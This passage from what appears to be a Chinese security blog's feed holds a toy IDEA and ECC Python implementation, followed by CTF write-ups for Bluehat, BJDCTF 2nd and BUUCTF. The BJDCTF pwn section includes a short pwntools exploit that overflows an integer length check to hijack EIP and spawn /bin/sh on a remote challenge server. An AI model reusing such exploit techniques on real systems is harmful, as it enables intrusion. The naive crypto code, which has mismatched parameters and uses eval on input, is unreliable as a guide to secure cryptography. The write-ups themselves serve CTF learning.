    Addrev = bin((65536 - int(i[1],2)) % 65536)[2:]
    i[1] = &#39;0&#39;*(16-len(Addrev)) + Addrev
    Addrev = bin((65536 - int(i[2],2)) % 65536)[2:]
    i[2] = &#39;0&#39;*(16-len(Addrev)) + Addrev
    Modrev = bin(FindMODreverse(int(i[0],2),65537))[2:]
    i[0] = &#39;0&#39;*(16-len(Modrev)) + Modrev
    Modrev = bin(FindMODreverse(int(i[3],2),65537))[2:]
    i[3] = &#39;0&#39;*(16-len(Modrev)) + Modrev

    key_decrypt_array.extend(i)

if mode == 0:                                   # 文本二元序列的分组
    mc_array = [ m_bin[i*64:i*64+64] \
        for i in range(int(len(m_bin) / 64)) ]  
else:
    mc_array = [ c_bin[i*64:i*64+64] \
        for i in range(int(len(c_bin) / 64)) ]

cm_array = []                                   # 求结果分组
if mode == 0:
    for i in mc_array:
        cm_array.append(idea_encode(i,0,key_encrypt_array))
else:
    for i in mc_array:
        cm_array.append(idea_encode(i,0,key_decrypt_array))

cm = &#39;&#39;                                      # 将结果分组转换为对应的十六进制内容
for i in cm_array:
    tmp = hex(int(i,2))[2:]
    if len(tmp) * 4 != len(i):
        tmp = &#39;0&#39;*int(len(i) / 4 - len(tmp)) + tmp
    cm += tmp

if mode == 0:
    print(&#39;密文：&#39; + cm)
else:
    print(&#39;明文(hex):&#39; + cm)

return cm
</code></pre><p>if <strong>name</strong> == “<strong>main</strong>“:<br>    m = ‘1234567812345678’<br>    key = ‘1234567812345678’<br>    c = IDEA_Crypto(m,key,0)<br>    m_tmp = IDEA_Crypto(c,key,1)<br>‘’’</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>(密码学)(crypto)ECC_Crypto(椭圆曲线加密)——python实现</title>
    <url>/2020/04/30/(crypto)ECC_Crypto/</url>
    <content><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 辗转相除求最大公因数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">div_fac</span>(<span class="params"> a, b </span>):</span></span><br><span class="line">    <span class="keyword">if</span> b !=  <span class="number">0</span>:</span><br><span class="line">        result = div_fac( b, a % b )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = a</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将负数结果转化为正数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_neg</span>(<span class="params"> a , b </span>):</span></span><br><span class="line">    <span class="keyword">while</span> a &lt;= <span class="number">0</span>:</span><br><span class="line">        a += b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用勒让德符号和二次互反律判断平方剩余是否存在</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Leg_Prime</span>(<span class="params"> a , p </span>):</span></span><br><span class="line">    a = a % p  </span><br><span class="line">    flag = <span class="number">1</span> ; a_x = [] ; i = <span class="number">2</span> ; tmp = a</span><br><span class="line">    <span class="keyword">while</span> i &lt; tmp ** <span class="number">0.5</span>:</span><br><span class="line">        <span class="keyword">if</span> tmp % i == <span class="number">0</span>:</span><br><span class="line">            tmp //= i</span><br><span class="line">            a_x.append(i)</span><br><span class="line">            i = <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a_x.append(tmp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a_x:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">if</span> p % <span class="number">8</span> == <span class="number">1</span> <span class="keyword">or</span> p % <span class="number">8</span> == <span class="number">7</span>:</span><br><span class="line">                flag *= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag *= ( -<span class="number">1</span> )</span><br><span class="line">        <span class="keyword">elif</span> i == -<span class="number">1</span> <span class="keyword">or</span> a == p-<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">                flag *= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag *= ( -<span class="number">1</span> )</span><br><span class="line">        <span class="comment">#flag_tmp = ( -1 ) ** (( a - 1 ) * ( p - 1 ) / 4) * Leg_Prime( p % i , i )</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag *= ( ( -<span class="number">1</span> ) ** (( a - <span class="number">1</span> ) * ( p - <span class="number">1</span> ) / <span class="number">4</span> ) ) * Leg_Prime( p , i )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># ECC加密中的加法运算实现</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_Add</span>(<span class="params"> A , B , p , a</span>):</span></span><br><span class="line">    <span class="keyword">if</span> A != B:</span><br><span class="line">        dx = A[<span class="number">0</span>] - B[<span class="number">0</span>]</span><br><span class="line">        dy = A[<span class="number">1</span>] - B[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dy = <span class="number">3</span> * ( A[<span class="number">0</span>] ** <span class="number">2</span> ) + a</span><br><span class="line">        dx = <span class="number">2</span> * A[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> dx == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    fac = div_fac( dx , dy )</span><br><span class="line">    dy //= fac</span><br><span class="line">    dx //= fac</span><br><span class="line">    tmp = dy % p</span><br><span class="line">    check_neg( tmp , p )</span><br><span class="line">    <span class="keyword">while</span> tmp % dx != <span class="number">0</span>:</span><br><span class="line">        tmp += p</span><br><span class="line">    k = tmp // dx</span><br><span class="line">    C_x = ( k ** <span class="number">2</span> - A[<span class="number">0</span>] - B[<span class="number">0</span>] ) % p</span><br><span class="line">    check_neg( C_x , p )</span><br><span class="line">    C_y = ( k * ( A[<span class="number">0</span>] - C_x ) - A[<span class="number">1</span>] ) % p</span><br><span class="line">    check_neg( C_y , p )</span><br><span class="line">    <span class="keyword">return</span> (C_x,C_y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求基点的阶</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_Order</span>(<span class="params"> G , p , a </span>):</span></span><br><span class="line">    flag = <span class="number">1</span> ; A = G ; B = G</span><br><span class="line">    <span class="keyword">while</span> flag :</span><br><span class="line">        flag += <span class="number">1</span></span><br><span class="line">        A = ECC_Add(A,B,p,a)</span><br><span class="line">        <span class="keyword">if</span> (( A[<span class="number">0</span>] ** <span class="number">3</span> + A[<span class="number">0</span>] + <span class="number">1</span> ) % p ) == (( A[<span class="number">1</span>] ** <span class="number">2</span> ) % p ):</span><br><span class="line">            <span class="keyword">if</span> A[<span class="number">0</span>] == G[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">return</span> flag + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!!!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;在第 &quot;</span> + <span class="built_in">str</span>(flag) + <span class="string">&quot; 次运算后结果错误！&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求取公钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_PublickeyFind</span>(<span class="params">p,a,G,d</span>):</span></span><br><span class="line">    A = G ; B = G</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; d:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        A = ECC_Add(A,B,p,a)</span><br><span class="line">        <span class="keyword">if</span> A == <span class="number">0</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            A = G</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将明文嵌入曲线</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_M</span>(<span class="params">m,p,a,b</span>):</span></span><br><span class="line">    M = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> m.encode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">        j = j * <span class="number">30</span></span><br><span class="line">        tmp = <span class="number">0</span> ; flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> tmp &lt; <span class="number">100</span>:</span><br><span class="line">            x = j + tmp</span><br><span class="line">            y_2 = ( x ** <span class="number">3</span> + a * x + b ) % p</span><br><span class="line">            tmp += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> Leg_Prime( y_2 , p ) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,p):</span><br><span class="line">                    <span class="keyword">if</span> ( i ** <span class="number">2</span> - y_2 ) % p == <span class="number">0</span>:</span><br><span class="line">                        M.append(( x , i ))</span><br><span class="line">                        flag = <span class="number">1</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;明文某字节在嵌入曲线时 100 次没有得到平方剩余&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    <span class="keyword">return</span> M</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_encode</span>(<span class="params">M,G,K,r,p,a</span>):</span></span><br><span class="line">    r_G = ECC_PublickeyFind(p,a,G,r)</span><br><span class="line">    r_K = ECC_PublickeyFind(p,a,K,r)</span><br><span class="line">    C_1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> M:</span><br><span class="line">        C_1.append(ECC_Add(i,r_K,p,a))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;C1为:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> C_1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&#x27;,&#x27;</span> ,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;C2为:&quot;</span> + <span class="built_in">str</span>(r_G))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_Encrypt</span>(<span class="params">p,a,b,G,n,d,m</span>):</span></span><br><span class="line">    K = ECC_PublickeyFind(p,a,G,d)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;公钥为：&quot;</span> + <span class="built_in">str</span>(K))</span><br><span class="line">    M = ECC_M(m,p,a,b)</span><br><span class="line">    r = random.randint(<span class="number">1</span>,n-<span class="number">1</span>)</span><br><span class="line">    ECC_encode(M,G,K,r,p,a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ECC_Decrypt</span>(<span class="params">C1,C2,d,p,a</span>):</span></span><br><span class="line">    C2_tmp = ECC_PublickeyFind(p,a,C2,d)</span><br><span class="line">    C2 = (C2_tmp[<span class="number">0</span>],-C2_tmp[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> C1:</span><br><span class="line">        M = ECC_Add(i,C2,p,a)[<span class="number">0</span>] // <span class="number">30</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(M),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    p,a,b,G,n = <span class="number">4177</span>,<span class="number">1</span>,<span class="number">1</span>,(<span class="number">0</span>,<span class="number">1</span>),<span class="number">28</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;本程序使用曲线方程为：y^2 = x^3 + x + 1&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;参数 p 选择为 23，基点为 (0,1), n 为 28&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;为减小计算压力，本程序为ASCII字符集逐字节加密&quot;</span>)</span><br><span class="line">    d = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入私钥：&quot;</span>))</span><br><span class="line">    m = <span class="built_in">input</span>(<span class="string">&quot;请输入要加密的数据：&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ECC_Encrypt(p,a,b,G,n,d,m)</span><br><span class="line"></span><br><span class="line">    C1 = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入C1:&quot;</span>))</span><br><span class="line">    C2 = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入C2:&quot;</span>))</span><br><span class="line"></span><br><span class="line">    ECC_Decrypt(C1,C2,d,p,a)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>2021-Bluehat-Online-Misc-Other</title>
    <url>/2021/04/30/2021-bluehat-misc/</url>
    <content><![CDATA[<h2 id="冬奥会-is-coming"><a href="#冬奥会-is-coming" class="headerlink" title="冬奥会_is_coming"></a>冬奥会_is_coming</h2><p>图片末尾有rar压缩包，注释中提示八位数字</p>
<p>压缩包本身无加密，猜测是MP3隐写用。使用mp3stego，密码猜测为冬奥会的时间。</p>
<p>解出一串十六进制编码，观察发现应该是utf-8编码，保存至记事本打开得到一串emoji，谷歌一下发现是wingding编码，解码得到提示。</p>
<p>去找提示中的1cePeak仓库，在仓库中的A/post-checkout文件中得到一串关键字符串：How_6ad_c0uld_a_1cePeak_be?</p>
<p>提交发现不是flag，再次查看mp3文件发现末尾有一串cipher。<br>继续转utf-8编码又是一串emoji，谷歌搜索得知是emoji-aes加密。用刚刚的字符串作为key，新的emoji为密文，解密得flag</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>BJD-2rd_Writeup(SOME)</title>
    <url>/2020/03/24/BJD-2rd/</url>
    <content><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="BJDCTF-2nd-最简单的misc-y1ng"><a href="#BJDCTF-2nd-最简单的misc-y1ng" class="headerlink" title="[BJDCTF 2nd]最简单的misc-y1ng"></a>[BJDCTF 2nd]最简单的misc-y1ng</h3><p>解压得到图片，打开看到一串十六进制，转ASCII字符得到flag</p>
<h3 id="BJDCTF-2nd-A-Beautiful-Picture"><a href="#BJDCTF-2nd-A-Beautiful-Picture" class="headerlink" title="[BJDCTF 2nd]A_Beautiful_Picture"></a>[BJDCTF 2nd]A_Beautiful_Picture</h3><p>改一下png图片高度即可</p>
<h3 id="BJDCTF-2nd-小姐姐-y1ng"><a href="#BJDCTF-2nd-小姐姐-y1ng" class="headerlink" title="[BJDCTF 2nd]小姐姐-y1ng"></a>[BJDCTF 2nd]小姐姐-y1ng</h3><p>winhex搜索字符串，关键字<code>BJD</code></p>
<h3 id="BJDCTF-2nd-EasyBaBa"><a href="#BJDCTF-2nd-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]EasyBaBa"></a>[BJDCTF 2nd]EasyBaBa</h3><p>winhex查看文件数据发现是avi类型的数据，打开发现里面放有二维码，拖进pr扫码，得到一串十六进制ASCII码，解码得到一串字符，该字符顺序明显不是原flag顺序，不过根据题目描述可以猜出二维码内容的排序</p>
<h3 id="BJDCTF-2nd-Real-EasyBaBa"><a href="#BJDCTF-2nd-Real-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]Real_EasyBaBa"></a>[BJDCTF 2nd]Real_EasyBaBa</h3><p>winhex发现文件末尾存在zip包，直接解压缩会报错，文件头附近会有包内的路径信息，所以直接搜索hint定位文件头，发现文件头被破坏了，修复一下拿到hint，打开发现是一个二维码，用手机晃动扫码（可以直接产生模糊效果，能省掉电脑PS的时间2333），得到一串命令，直接去kali里面对这个图片复制命令操作，发现：<br><img src="http://lychee.xibai.xyz/uploads/big/34e6bcf7c2f2910d657c9ed34abbe7f7.png" alt="rezbb"></p>
<h3 id="BJDCTF-2nd-圣火昭昭-y1ng"><a href="#BJDCTF-2nd-圣火昭昭-y1ng" class="headerlink" title="[BJDCTF 2nd]圣火昭昭-y1ng"></a>[BJDCTF 2nd]圣火昭昭-y1ng</h3><p>图片备注是解密后得到<code>key</code>，提示说正确的key没有最后的<code>com</code>，然后用outguess解密，key为密钥，得到flag</p>
<h3 id="BJDCTF-2nd-TARGZ-y1ng"><a href="#BJDCTF-2nd-TARGZ-y1ng" class="headerlink" title="[BJDCTF 2nd]TARGZ-y1ng"></a>[BJDCTF 2nd]TARGZ-y1ng</h3><p>虽然我曾说shell是最垃圾的语言，然而此刻还是，真香！</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">flag=1</span><br><span class="line">while (($flag==1))</span><br><span class="line">do</span><br><span class="line">  file1=`ls | grep tar.gz`</span><br><span class="line">  if [ $&#123;file1:0-6&#125; == &#x27;tar.gz&#x27; ]</span><br><span class="line">  then</span><br><span class="line">    unzip -P $&#123;file1::0-7&#125; $file1</span><br><span class="line">    rm $file1</span><br><span class="line">  else</span><br><span class="line">    cat $file1</span><br><span class="line">    flag=$flag+1</span><br><span class="line">  fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<h3 id="BJDCTF-2nd-Imagin-开场曲"><a href="#BJDCTF-2nd-Imagin-开场曲" class="headerlink" title="[BJDCTF 2nd]Imagin - 开场曲"></a>[BJDCTF 2nd]Imagin - 开场曲</h3><p>有一说一，再次体验到被针对的感觉，就是去mikutap人耳判断每个按键触发的声音和音频里的声音吻合度来判断按键。这里我的 <kbd>5</kbd> 对应的那个音是其他人 <kbd>1</kbd> 对应的音，心态炸裂。flag{mikutap3313313}</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="BJDCTF-2nd-签到-y1ng"><a href="#BJDCTF-2nd-签到-y1ng" class="headerlink" title="[BJDCTF 2nd]签到-y1ng"></a>[BJDCTF 2nd]签到-y1ng</h3><p>base64解码</p>
<h3 id="BJDCTF-2nd-老文盲了"><a href="#BJDCTF-2nd-老文盲了" class="headerlink" title="[BJDCTF 2nd]老文盲了"></a>[BJDCTF 2nd]老文盲了</h3><p>查这几个生僻字读音可得：flag{这就是flag直接交了吧}<br>即：读音为大括号的生僻字中间的生僻字就是flag</p>
<h3 id="BJDCTF-2nd-cat-flag"><a href="#BJDCTF-2nd-cat-flag" class="headerlink" title="[BJDCTF 2nd]cat_flag"></a>[BJDCTF 2nd]cat_flag</h3><p>发现每一行有八只猫咪，总共十行，而且总共只有两种猫咪，所以将其转换为十个二进制ASCII码，再转成字符即可</p>
<h3 id="BJDCTF-2nd-灵能精通-y1ng"><a href="#BJDCTF-2nd-灵能精通-y1ng" class="headerlink" title="[BJDCTF 2nd]灵能精通-y1ng"></a>[BJDCTF 2nd]灵能精通-y1ng</h3><p>圣堂武士密码，猪圈密码变种</p>
<h3 id="BJDCTF-2nd-燕言燕语-y1ng"><a href="#BJDCTF-2nd-燕言燕语-y1ng" class="headerlink" title="[BJDCTF 2nd]燕言燕语-y1ng"></a>[BJDCTF 2nd]燕言燕语-y1ng</h3><p>十六进制转字符得到：yanzi ZJQ{xilzv_iqssuhoc_suzjg}<br>明显是维吉尼亚密码，yanzi 是 key，解密一下得到 flag<br>BJD{yanzi_jiushige_shabi}</p>
<h3 id="BJDCTF-2nd-Y1nglish-y1ng"><a href="#BJDCTF-2nd-Y1nglish-y1ng" class="headerlink" title="[BJDCTF 2nd]Y1nglish-y1ng"></a>[BJDCTF 2nd]Y1nglish-y1ng</h3><p>quipquip在线解密嘿嘿嘿，最后的flag修一下错误单词即可</p>
<h3 id="BJDCTF-2nd-rsa0"><a href="#BJDCTF-2nd-rsa0" class="headerlink" title="[BJDCTF 2nd]rsa0"></a>[BJDCTF 2nd]rsa0</h3><h3 id="BJDCTF-2nd-rsa1"><a href="#BJDCTF-2nd-rsa1" class="headerlink" title="[BJDCTF 2nd]rsa1"></a>[BJDCTF 2nd]rsa1</h3><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h3><p>简单的整数溢出<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200330162304.png" alt="20200330162304"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200330162326.png" alt="20200330162326"><br>可以输入<code>0x400</code>bytes的数据，但是会用<code>strlen</code>函数获取输入长度，要求长度大于3小于9，而覆盖<code>ret</code>的返回地址需要总共<code>0x19</code>bytes的数据。这时候注意<code>v3</code>是一个<code>int8</code>类型的无符号变量，也就是<code>v3</code>最大也只能是<code>255</code>，超过<code>255</code>的话相当于做了一次<code>%255</code>的运算。也就是我们可以通过输入大于<code>0x103</code>小于<code>0x109</code>bytes的数据来绕过if判断，从而成功劫持<code>EIP</code>。又发现程序内置了<code>system(&quot;/bin/sh&quot;)</code>函数，直接调用即可。exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./r2t3&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27348</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x15</span>+p32(<span class="number">0x08048594</span>)+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x105</span>-<span class="number">0x19</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h3><h3 id="BJDCTF-2nd-ydsneedgirlfriend2"><a href="#BJDCTF-2nd-ydsneedgirlfriend2" class="headerlink" title="[BJDCTF 2nd]ydsneedgirlfriend2"></a>[BJDCTF 2nd]ydsneedgirlfriend2</h3><h3 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="[BJDCTF 2nd]r2t4"></a>[BJDCTF 2nd]r2t4</h3><h3 id="BJDCTF-2nd-secret"><a href="#BJDCTF-2nd-secret" class="headerlink" title="[BJDCTF 2nd]secret"></a>[BJDCTF 2nd]secret</h3><h3 id="BJDCTF-2nd-rci"><a href="#BJDCTF-2nd-rci" class="headerlink" title="[BJDCTF 2nd]rci"></a>[BJDCTF 2nd]rci</h3><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="BJDCTF-2nd-guessgame"><a href="#BJDCTF-2nd-guessgame" class="headerlink" title="[BJDCTF 2nd]guessgame"></a>[BJDCTF 2nd]guessgame</h3><p>拖进ida查找字符串即可得到flag</p>
<h3 id="BJDCTF-2nd-8086"><a href="#BJDCTF-2nd-8086" class="headerlink" title="[BJDCTF 2nd]8086"></a>[BJDCTF 2nd]8086</h3><p>ida查看发现一段没有用到的十六进制数据，已知的内容仅是一串明显加密了的字符串和一个死循环，很明显这串十六进制应该是做题的关键数据，使用ida的分析命令将其分析为汇编指令，发现果然是密文相关的操作。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200330161628.png" alt="20200330161628"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200330161858.png" alt="20200330161858"><br>写出脚本解得flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag_encode = <span class="string">&quot;]U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b;&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag_encode:</span><br><span class="line">  flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="number">0x1f</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="BJDCTF-2nd-diff2"><a href="#BJDCTF-2nd-diff2" class="headerlink" title="[BJDCTF 2nd]diff2"></a>[BJDCTF 2nd]diff2</h3>]]></content>
      <categories>
        <category>CTF-Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-MISC(一)</title>
    <url>/2020/01/11/BUU-Misc-one/</url>
    <content><![CDATA[<p><strong>最近更新：</strong> <em>2020-01-31 22:43</em></p>
<h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><p>打开题目是一个动态图，分解动态图即得flag</p>
<h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>扫描得到提示秘密在这里，winhex查看发现末尾有压缩包，提取出来被加密，直接爆破密码可得flag</p>
<h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>winhex查看发现是base64编码的图片，在线工具转一下拿到一个二维码，扫一下即可</p>
<h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>根据提示打开发现图片疑似少了一截，winhex修改长宽，拿到flag</p>
<h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>提示四位数字，直接爆破得到密码，解压得到一串base64字符串，解base64即可</p>
<h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>winhex查看十六进制发现末尾有flag</p>
<h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>StegSolve查看发现最低位隐藏了信息，是一个png文件的十六进制数据，保存出来，是个二维码，扫码得flag</p>
<h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>文件末尾是flag</p>
<h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p>爆破密码</p>
<h2 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h2><p>扫码签到</p>
<h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>winhex发现压缩包，提取爆破密码</p>
<h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><p>查看文件属性发现flag</p>
<h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>打开流量包查看http流量，发现有一条流量的传参有flag字样，flag后的password内容即<br>为flag</p>
<h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><p>StegSolve看lsb最低位隐写</p>
<h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><p>图片末尾有一个rar加密包，爆破即可</p>
<h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p>这个题 脑洞了 一下，把图片备注里的this_is_not_password作为压缩包密码了，输入this_is_not_password解压即可</p>
<h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p>查看流量包发现有一个post表单，跟进去搜索flag即可</p>
<h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><p>一个加密压缩包，一个图片，图片上是海伦凯勒，下面有一行盲文，盲文的明文即为压缩包密码，解压缩得到一个音频，是莫斯电码，用音频分析软件查看摩斯电码，转为明文为flag内容，另外，莫斯电码都是小写！</p>
<h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>入门的wireshark流量分析，wireshark打开后直接右键追踪TCP流即可看到flag</p>
<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>在用stegsolve查看lsb的时候发现其用lsb写入了一个zip文件，save bin出来解压缩，用winhex查看发现是elf文件，ida打开搜索字符串发现flag</p>
<h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><p>题目是一个jpg文件，winhex发现尾部有一串ASCII码，写个脚本转码就是flag</p>
